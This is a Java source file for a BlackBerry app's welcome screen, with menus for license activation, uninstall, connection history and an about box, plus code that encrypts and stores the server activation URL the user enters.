package com.vvt.screen;

import java.util.Timer;
import java.util.TimerTask;

import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.prot.CommandResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendActivateManager;
import com.vvt.std.Log;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.Field;

public class WelcomeScreen extends MainScreen implements PhoenixProtocolListener {
	
	private MenuItem activationMenu = null;
	private MenuItem uninstallMenu = null;
	private MenuItem aboutMenu = null;
	private MenuItem statusMenu = null;
	private MenuItem lastConnectionMenu = null;
	private MenuItem connHistoryMenu = null;
	private RichTextField welcomeTextField = null;
	private SendActivateManager actMgr = Global.getSendActivateManager();
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private LicenseInfo license = null;
	private WelcomeScreen self = null;
	private ProgressThread progressThread = null;
	
	public WelcomeScreen() {
		self = this;
//		setTitle(MainAppTextResource.WELCOME_SCREEN_TITLE);
		removeAllMenuItems();
		// To init welcome message.
		welcomeTextField = new RichTextField(MainAppTextResource.WELCOME_SCREEN_WELCOME_MESSAGE, Field.NON_FOCUSABLE);
		add(welcomeTextField);
		// To create menu.
		activationMenu = new MenuItem(MainAppTextResource.WELCOME_SCREEN_ACTIVATION_MENU, 2400000, MenuItem.SELECT) {
        	public void run() {
    			// To bring activation UI.
        		UiApplication.getUiApplication().pushScreen(new ActivationPopup(self));
        	}
        };
        uninstallMenu = new MenuItem(MainAppTextResource.WELCOME_SCREEN_UNINSTALL_MENU, 2400100, 1024) {
        	public void run() {
        		try {
        			license = licenseMgr.getLicenseInfo();
        			if (license.getLicenseStatus() == LicenseStatus.ACTIVATED) {
						Dialog dialog = new Dialog(Dialog.D_OK, MainAppTextResource.WELCOME_SCREEN_UNINSTALL_CHECK_STATE_DEACTIVATE, Dialog.OK, null, Field.USE_ALL_WIDTH);
						dialog.doModal();
					} else {
						Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.WELCOME_SCREEN_UNINSTALL_BEFORE, Dialog.NO, null, DEFAULT_CLOSE);
						int selected = dialog.doModal();
						if (selected == Dialog.YES) {
							uninstallApplication();
							synchronized (Application.getEventLock()) {
								Dialog.alert(MainAppTextResource.WELCOME_SCREEN_UNINSTALL_AFTER);
								System.exit(0);
							}
						}
					}
				} catch (Exception e) {
					Log.error("WelcomeScreen.uninstallMenu", null, e);
				}
        	}
        };
        lastConnectionMenu = new MenuItem(MainAppTextResource.LAST_CONNECTION_SCREEN_LABEL, 3300000, 1024) {
        	public void run() {
        		UiApplication.getUiApplication().pushScreen(new ConnectionScreen(0));
        	}
        }; 
        connHistoryMenu = new MenuItem(MainAppTextResource.CONNECTION_HISTORY_SCREEN_LABEL, 3300000, 1024) {
        	public void run() {
        		UiApplication.getUiApplication().pushScreen(new ConnectionScreen(1));
        	}
        };
        aboutMenu = new MenuItem(MainAppTextResource.SETTING_SCREEN_ABOUT, 3400000, 1024) {
        	public void run() {
				UiApplication.getUiApplication().pushScreen(new AboutPopup());
        	}
        };
        addMenuItem(activationMenu);
        addMenuItem(uninstallMenu);        
        addMenuItem(lastConnectionMenu);
        addMenuItem(connHistoryMenu);
        addMenuItem(aboutMenu);
	}
	
	public void notifyActivation(String url) {
		try {
			if (!url.endsWith("/")) {
				url += "/";
			}
			url += "gateway";
			String http = "http://";
			if (!url.startsWith(http)) {
				url = http.concat(url);
			}			
			// To start activation.
			removeMenuItem(activationMenu);
			byte[] key = AESKeyGenerator.generateAESKey();
			byte[] encryptedUrl = AESEncryptor.encrypt(key, url.getBytes());
			serverUrl.setServerActivationUrl(key, encryptedUrl);
			serverUrl.setServerDeliveryUrl(key, encryptedUrl);
			actMgr.addListener(this);
			actMgr.activate(null);
			// To start progress bar.
			progressThread = new ProgressThread(this);
			progressThread.start();
		} catch(Exception e) {
			Log.error("WelcomeScreen.notifyActivation", null, e);
		}
	}
	
	private void uninstallApplication() {
		try {
			int moduleHandle = CodeModuleManager.getModuleHandle(ApplicationInfo.APPLICATION_NAME);
			CodeModuleManager.deleteModuleEx(moduleHandle, true);			
		} catch (Exception e) {
			Log.error("WelcomeScreen.uninstallApplication", null, e);
		}
	}
	
	private void cancelProgressBar() {
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run() {
				if (progressThread.isAlive()) {
					progressThread.stopProgressThread();
				}
				addMenuItem(activationMenu);
			}
		});
	}
	
	// Screen
	public boolean onClose() {
		UiApplication.getUiApplication().requestBackground();
		return false;
	}

	// PhoenixProtocolListener
	public void onError(final String message) {
		actMgr.removeListener(this);
		cancelProgressBar();
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				synchronized (Application.getEventLock()) {
					Dialog.alert(message);
				}
			}
		});
	}

	public void onSuccess(CommandResponse cmdResponse) {
		actMgr.removeListener(this);
		cancelProgressBar();
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {				
				synchronized (Application.getEventLock()) {
					Dialog.alert(MainAppTextResource.WELCOME_SCREEN_ACTIVATE_SUCCESS);
				}	
			}
		});
	}
}
